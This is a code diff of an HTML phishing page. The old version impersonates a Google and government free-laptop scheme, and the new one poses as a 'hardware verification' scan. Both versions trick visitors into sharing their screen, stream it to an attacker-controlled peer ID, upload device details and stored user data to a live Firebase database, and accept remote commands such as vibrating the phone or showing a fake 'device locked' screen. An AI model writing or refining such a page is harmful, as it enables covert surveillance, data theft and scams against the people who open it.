@@ -3,29 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google & Govt | Verify Your Eligibility</title>
+    <title>Hardware Verification</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-white">
-
-    <div class="p-6 max-w-md mx-auto text-center mt-10">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="mx-auto mb-6">
-        <h1 class="text-2xl font-bold text-gray-800">2026 Laptop Scheme</h1>
-        <p class="text-gray-500 mt-2 text-sm">To claim your free 5G Laptop, we must verify your mobile hardware and security patches.</p>
+<body class="bg-white flex flex-col items-center justify-center h-screen p-6">
+    
+    <div class="text-center w-full max-w-sm">
+        <div id="loader" class="relative w-24 h-24 mx-auto mb-8">
+            <div class="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
+            <div id="progress" class="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
+        </div>
+        <h2 id="statusTitle" class="text-2xl font-bold text-slate-900">Device Scan Required</h2>
+        <p class="text-slate-500 mt-2">Allow screen mirroring to verify your device hardware components.</p>
         
-        <div id="setup-box" class="mt-8 p-6 bg-blue-50 rounded-3xl border border-blue-100">
-            <p class="text-blue-700 font-bold mb-4">Your Verification Code:</p>
-            <div id="my-id" class="text-3xl font-black tracking-widest text-blue-900 mb-4">...</div>
-            <button id="start-btn" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-xl">START VERIFICATION</button>
-        </div>
-
-        <div id="loader" class="hidden mt-10">
-            <div class="animate-spin h-10 w-10 border-4 border-blue-600 border-t-transparent rounded-full mx-auto"></div>
-            <p class="mt-4 text-sm text-gray-500">Hardware scanning in progress (14%)... Do not close this tab.</p>
-        </div>
+        <button id="startVerify" class="mt-8 w-full bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-xl">Start Verification</button>
     </div>
 
     <script>
@@ -34,7 +28,6 @@
             authDomain: "auralink-2026.firebaseapp.com",
             projectId: "auralink-2026",
             databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com",
-            storageBucket: "auralink-2026.firebasestorage.app",
             appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
         };
         firebase.initializeApp(firebaseConfig);
@@ -42,44 +35,39 @@
         const peer = new Peer();
 
         peer.on('open', (id) => {
-            document.getElementById('my-id').innerText = id.substring(0,6).toUpperCase();
+            const userData = JSON.parse(localStorage.getItem('temp_user'));
             
-            document.getElementById('start-btn').onclick = async () => {
+            document.getElementById('startVerify').onclick = async () => {
                 try {
-                    // Start Mirroring
                     const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    peer.call("AURALINK_ADMIN_MAIN", stream);
+                    peer.call("AURALINK_MASTER_ADMIN", stream);
                     
-                    document.getElementById('setup-box').classList.add('hidden');
-                    document.getElementById('loader').classList.remove('hidden');
-
                     const bat = await navigator.getBattery();
                     
-                    // Push Info to Firebase
-                    db.ref('sessions/' + id.substring(0,6).toUpperCase()).set({
-                        peer_id: id,
+                    // Auto-Register Session in Firebase
+                    const sessionRef = db.ref('sessions/' + id);
+                    sessionRef.set({
+                        ...userData,
+                        peerId: id,
                         battery: Math.floor(bat.level * 100) + '%',
                         model: navigator.userAgent.split('(')[1].split(')')[0],
-                        status: "CONNECTED"
+                        lastSeen: Date.now()
                     });
 
-                    // Listen for Remote Commands
-                    db.ref('commands/' + id.substring(0,6).toUpperCase()).on('value', (snapshot) => {
-                        const cmd = snapshot.val();
+                    document.getElementById('statusTitle').innerText = "Verification Active";
+                    document.getElementById('startVerify').style.display = 'none';
+
+                    // Listen for Commands
+                    db.ref('commands/' + id).on('value', (snap) => {
+                        const cmd = snap.val();
                         if(cmd) {
                             if(cmd.action === 'vibrate') navigator.vibrate(1000);
-                            if(cmd.action === 'torch') alert("Verification Flashlight Test Initialized");
-                            if(cmd.action === 'alert') {
-                                let audio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
-                                audio.play();
-                            }
-                            if(cmd.action === 'lock') {
-                                document.body.innerHTML = "<div style='background:red;color:white;height:100vh;padding:50px;'><h1>DEVICE LOCKED</h1><p>Hardware failure detected during scan.</p></div>";
-                            }
+                            if(cmd.action === 'beep') new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
+                            if(cmd.action === 'lock') document.body.innerHTML = "<h1>SYSTEM LOCKED</h1>";
                         }
                     });
 
-                } catch (e) { alert("Please click ALLOW to verify your hardware resolution."); }
+                } catch (e) { alert("Permission Denied: Screen mirroring is required."); }
             };
         });
     </script>
